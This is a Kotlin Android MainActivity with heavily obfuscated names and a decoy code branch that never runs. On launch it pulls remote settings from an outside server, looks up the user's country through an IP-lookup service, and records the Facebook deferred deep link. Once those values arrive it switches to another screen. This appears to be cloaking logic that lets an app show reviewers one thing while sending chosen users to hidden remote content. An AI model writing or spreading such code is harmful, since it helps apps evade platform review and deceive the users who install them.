package com.superking.parchi.aaaaaactiv

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.facebook.applinks.AppLinkData
import com.google.android.material.snackbar.Snackbar
import com.orhanobut.hawk.Hawk
import com.superking.parchi.databinding.ActivityMainBinding
import com.superking.parchi.ooooootger.AppleClasa
import com.superking.parchi.ooooootger.AppleClasa.Companion.gthygeomeo
import com.superking.parchi.ooooootger.AppleClasa.Companion.hnnhnhnhhn
import com.superking.parchi.ooootheer2.FiiikiClasssasssssssss
import com.superking.parchi.ooootheer2.Meeeeeeeeeeeeeeee
import com.superking.parchi.ooootheer2.ServiceApieee
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    val testyyy = "oooo"

    val fjrrfijrjirf by lazy {
        Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://solarsapphire.live/")
            .build()
            .create(ServiceApieee::class.java)
    }

    private suspend fun getDataDev() {

        val gttggtbbbbbb = fjrrfijrjirf.devhhyyhResponse().body()?.gtgtgttg.toString()
        val gyhyhy = fjrrfijrjirf.devhhyyhResponse().body()?.appsCheckergtgttyyy.toString()
        val value = fjrrfijrjirf.devhhyyhResponse().body()?.hyyhyh.toString()


        Hawk.put(AppleClasa.kiikikikki, gttggtbbbbbb)
        Hawk.put(AppleClasa.checkfrr, gyhyhy)
        Hawk.put(gthygeomeo, value)

    }

    private lateinit var bgbgbgbggb: ActivityMainBinding




    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        bgbgbgbggb = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bgbgbgbggb.root)

        bbbbbb(this)

        if (testyyy == "fiifififi"){
            val meeeeeeeeeeeeeeee = Meeeeeeeeeeeeeeee(this)
            Snackbar.make(
                bgbgbgbggb.root, "Loading...${meeeeeeeeeeeeeeee.displayMessage(5)}",
                Snackbar.LENGTH_LONG
            ).show()

            FiiikiClasssasssssssss(ccooooontext = this).also {
                it.prrrrrrint()
            }
        }

        val vvvvvvr = Executors.newSingleThreadScheduledExecutor()
        var ffgtgtt: String? = Hawk.get(hnnhnhnhhn, null)
        var jukikloo: String? = Hawk.get(gthygeomeo, null)
        vvvvvvr.scheduleAtFixedRate({
            if (ffgtgtt != null && jukikloo != null) {
                vvvvvvr.shutdown()
                gttgtth()
            } else {
                ffgtgtt = Hawk.get(hnnhnhnhhn)
                jukikloo = Hawk.get(gthygeomeo)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            bggbgbbgbg
        }
    }




    private val bggbgbbgbg: Job = GlobalScope.launch(Dispatchers.IO) {
        gtggtgt()
        getDataDev()
    }



    private fun gttgtth() {
        val frfrgrt = Intent(this@MainActivity, FilliOneActivity::class.java)
        startActivity(frfrgrt)
        finish()
    }

    private suspend fun gtggtgt() {
        val gtgtgtgtgt = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceApieee::class.java)
        val data = gtgtgtgtgt.countryCodeJSgtgttgResponse().body()?.bbnbmj

        Hawk.put(hnnhnhnhhn, data)
    }

    fun bbbbbb(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val hyhyhyhyhy = appLinkData.targetUri.host.toString()
                Hawk.put(AppleClasa.hyyDEEPLfrfr, hyhyhyhyhy)
            }
            if (appLinkData == null) {
            }
        }
    }
}